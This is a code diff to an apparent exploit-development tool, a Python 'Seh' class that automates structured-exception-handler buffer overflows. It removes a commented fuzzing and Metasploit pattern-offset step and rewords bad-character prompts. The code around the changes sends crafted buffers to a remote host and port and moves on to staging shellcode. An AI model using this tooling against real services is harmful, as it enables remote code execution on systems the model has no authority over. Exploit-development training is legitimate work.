@@ -103,34 +103,6 @@ class Seh:
             else:
                 print("[!] Got from session OFFSET " + str(self.config.offset))
 
-            # self.offset = System.input(
-            #     "[?] Press ENTER if you wanna fuzz the application or input the offset to skip this:")
-            #
-            # if (self.offset != ""):
-            #     self.offset = int(self.offset)
-            # else:
-            #     self.offset = 0
-
-            # if (self.overflow == 0 and self.offset == 0):
-            #     self.overflow = fuzzer_func(self.config.remoteip, self.config.remoteport, self.config.field, 1000, 500)
-            #
-            #     print("!" * 100)
-            #     print("[+] Application crashed at %s bytes" % self.overflow)
-            #
-            # if (self.offset == 0 and self.overflow > 0):
-            #     print("[+] Generating pattern: msf-pattern_create -l %s" % self.overflow)
-            #
-            #     buffer = subprocess.check_output(['msf-pattern_create', '-l', str(self.overflow)]).strip()
-            #
-            #     gonext = System.input("[?] Press ENTER when you wanna give the shot!!! This will send the PATTERN imediately!!!")
-            #
-            #     # print(buffer);
-            #
-            #     inject_func(self.config.remoteip, self.config.remoteport, self.config.field, buffer, True)
-            #     print("[+] Buffer Injected " + str(len(buffer)) + " bytes to get OFFSET!!!")
-            #     print("[!] Hint: !mona findmsp")
-            #     self.offset = System.input("[?] Check the target debugger and enter offset for NSEH Field:")
-
             buffer = self.stack_fit()
 
             if (self.config.verbose_lv >= 1):
@@ -188,7 +160,7 @@ class Seh:
             #########################################################
             # BADCHARS
 
-            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip]")
+            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip:")
 
             if(gonext == "T"):
                 self.config.payload = System.bytearray
@@ -198,7 +170,7 @@ class Seh:
                 inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
 
             if(gonext != "S"):
-                bads = System.input("[+] Badchars detected : " + ",".join(System.badchars) + " Additional Badchars? Separate multiple HEX (without 0x) by commas :")
+                bads = System.input("[+] Default Badchars is " + ",".join(System.badchars) + ". Additional Badchars? Separate multiple HEX (without 0x) by commas :")
 
                 if ',' in bads:
                     _bads = bads.split(',')
@@ -207,7 +179,7 @@ class Seh:
                 elif bads != "":
                     System.badchars.append(r'\x' + bads)
 
-                self.config.badchars = System.badchars
+            self.config.badchars = System.badchars
 
             #########################################################
             # SHELLCODE
